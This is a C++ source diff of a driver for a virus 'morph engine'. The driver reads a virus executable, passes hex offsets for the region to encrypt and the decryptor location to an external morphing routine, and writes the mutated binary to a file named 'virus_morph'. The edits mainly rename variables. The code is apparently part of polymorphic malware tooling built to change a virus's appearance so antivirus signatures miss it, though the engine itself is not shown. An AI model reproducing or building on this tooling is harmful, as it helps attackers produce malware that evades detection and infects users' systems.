@@ -6,7 +6,7 @@
 #include <iostream>
 #include <fstream>
 
-extern "C" int morph_engine(char* exe_data, size_t virus_beg_offset, size_t virus_size, size_t dec_offset);
+extern "C" int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 using namespace std;
 int main(int argc, char* argv[])
 {
@@ -23,29 +23,29 @@ int main(int argc, char* argv[])
 
 	// get the arguments
 	const char* virus_name = argv[1];
-	const size_t virus_offset  = strtoull(argv[2], nullptr, 16);
-	const size_t virus_size    = strtoull(argv[3], nullptr, 16);
-	const size_t dec_offset  = strtoull(argv[4], nullptr, 16);
+	const size_t virus_instruction_begin  = strtoull(argv[2], nullptr, 16);
+	const size_t virus_encrypt_size    = strtoull(argv[3], nullptr, 16);
+	const size_t virus_decrypt_offset  = strtoull(argv[4], nullptr, 16);
 
 
 	// open the executable file
-	FILE* exe_file = fopen(virus_name, "rb");
-	if(!exe_file)
+	FILE* virus_file = fopen(virus_name, "rb");
+	if(!virus_file)
 	{
-		cout << "Error opening " <<  virus_offset << endl;
+		cout << "Error opening " <<  virus_name << endl;
 		return 1;
 	}
 
 	// get the size of the executable file
-	size_t exe_size;
-	fseek(exe_file, 0, SEEK_END);
-	exe_size = ftell(exe_file);
-	rewind(exe_file);
+	size_t virus_size;
+	fseek(virus_file, 0, SEEK_END);
+	virus_size = ftell(virus_file);
+	rewind(virus_file);
 
 
-    char* exe_data = new char[exe_size];
-    fread(exe_data, exe_size, 1, exe_file);
-    if(morph_engine(exe_data, virus_offset, virus_size, dec_offset) != 0)
+    char* virus_data = new char[virus_size];
+    fread(virus_data, virus_size, 1, virus_file);
+    if(morph_engine(virus_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
 	{
 		cout << "Encoutered errors in the morph engine" << endl;
 
@@ -54,7 +54,7 @@ int main(int argc, char* argv[])
 
     std::ofstream outfile ("virus_morph",std::ofstream::binary);
     // write to outfile
-    outfile.write (exe_data,exe_size);
+    outfile.write (virus_data,virus_size);
 
 
 
